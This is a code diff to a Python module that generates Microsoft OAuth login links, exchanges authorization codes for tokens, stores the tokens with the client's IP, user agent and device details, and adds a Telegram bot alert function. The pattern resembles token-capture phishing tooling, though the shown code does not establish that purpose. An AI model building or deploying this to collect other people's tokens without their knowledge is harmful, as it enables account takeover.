@@ -20,10 +20,35 @@ TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
 
 
 # =========================
+# TELEGRAM ALERT (✅ FIX ADDED)
+# =========================
+def send_telegram_alert(message: str):
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        print("⚠️ Telegram not configured, skipping alert")
+        return
+
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+
+    payload = {
+        "chat_id": TELEGRAM_CHAT_ID,
+        "text": message
+    }
+
+    try:
+        res = requests.post(url, data=payload)
+
+        if res.status_code != 200:
+            print(f"❌ Telegram error: {res.text}")
+
+    except Exception as e:
+        print(f"❌ Telegram exception: {e}")
+
+
+# =========================
 # TOKEN STORAGE
 # =========================
 def save_token(user_id, session_id, token_data, device_info=None):
-    init_db()  # ✅ FIX: ensure table exists
+    init_db()
 
     db = SessionLocal()
 
@@ -63,7 +88,7 @@ def save_token(user_id, session_id, token_data, device_info=None):
 
 
 def get_token(user_id, session_id=None):
-    init_db()  # ✅ FIX: ensure table exists BEFORE query
+    init_db()
 
     db = SessionLocal()
 
@@ -83,10 +108,10 @@ def get_token(user_id, session_id=None):
 def generate_login_link(user_id_or_tenant: str):
     base_url = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
 
-    session_id = str(uuid.uuid4())  # Unique session_id for this login session
+    session_id = str(uuid.uuid4())
     state_value = f"{user_id_or_tenant}:{session_id}"
 
-    print(f"DEBUG: Generated state_value: {state_value}")  # Debugging line
+    print(f"DEBUG: Generated state_value: {state_value}")
 
     params = {
         "client_id": CLIENT_ID,
@@ -98,7 +123,7 @@ def generate_login_link(user_id_or_tenant: str):
     }
 
     login_url = f"{base_url}?{urlencode(params)}"
-    print(f"DEBUG: Generated login_url: {login_url}")  # Debugging line
+    print(f"DEBUG: Generated login_url: {login_url}")
 
     return login_url
 
@@ -107,10 +132,10 @@ def generate_login_link(user_id_or_tenant: str):
 # TOKEN EXCHANGE
 # =========================
 def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_agent: str = None):
-    init_db()  # ✅ FIX: ensure table exists
+    init_db()
 
-    state = unquote(state)  # ✅ FIX: decode URL-encoded state
-    print(f"DEBUG: Decoded state: {state}")  # Debugging line
+    state = unquote(state)
+    print(f"DEBUG: Decoded state: {state}")
 
     if ":" in state:
         user_id, session_id = state.split(":")
@@ -118,7 +143,7 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
         user_id = state
         session_id = "default"
 
-    print(f"DEBUG: Extracted user_id: {user_id}, session_id: {session_id}")  # Debugging line
+    print(f"DEBUG: Extracted user_id: {user_id}, session_id: {session_id}")
 
     data = {
         "client_id": CLIENT_ID,
